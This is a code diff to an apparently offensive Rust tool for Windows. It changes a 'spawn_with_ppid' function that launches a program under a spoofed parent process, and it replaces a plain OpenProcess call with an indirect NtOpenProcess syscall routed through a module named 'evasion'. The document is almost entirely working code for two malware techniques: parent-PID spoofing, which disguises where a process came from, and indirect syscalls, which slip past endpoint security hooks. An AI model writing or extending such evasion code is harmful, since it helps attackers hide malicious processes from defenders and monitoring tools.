@@ -1,7 +1,7 @@
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
     System::Threading::{
-        OpenProcess, CreateProcessA, InitializeProcThreadAttributeList,
+        CreateProcessA, InitializeProcThreadAttributeList,
         UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
         PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
         STARTUPINFOEXA, PROCESS_INFORMATION,
@@ -13,13 +13,41 @@ use windows_sys::Win32::{
 };
 
 #[cfg(target_os = "windows")]
+#[repr(C)]
+struct ObjectAttributes {
+    length: u32,
+    root_directory: usize,
+    object_name: usize,
+    attributes: u32,
+    security_descriptor: usize,
+    security_quality_of_service: usize,
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct ClientId {
+    unique_process: usize,
+    unique_thread: usize,
+}
+
+#[cfg(target_os = "windows")]
 pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(isize, isize)> {
     let parent_pid = find_pid_by_name(parent_name)?;
-    let h_parent = OpenProcess(
-        PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION,
-        0, parent_pid,
+    let mut oa: ObjectAttributes = unsafe { core::mem::zeroed() };
+    oa.length = core::mem::size_of::<ObjectAttributes>() as u32;
+    let mut cid: ClientId = unsafe { core::mem::zeroed() };
+    cid.unique_process = parent_pid as usize;
+    let mut h_parent: isize = 0;
+    let (ssn_open, tramp_open) = crate::evasion::syscalls::get_ssn(b"NtOpenProcess")?;
+    let status = crate::evasion::syscalls::indirect_syscall(
+        ssn_open, tramp_open,
+        &mut h_parent as *mut isize as usize,
+        (PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION) as usize,
+        &oa as *const ObjectAttributes as usize,
+        &cid as *const ClientId as usize,
+        0, 0,
     );
-    if h_parent == 0 { return None; }
+    if status < 0 || h_parent == 0 { return None; }
 
     let mut attr_size: usize = 0;
     InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size);
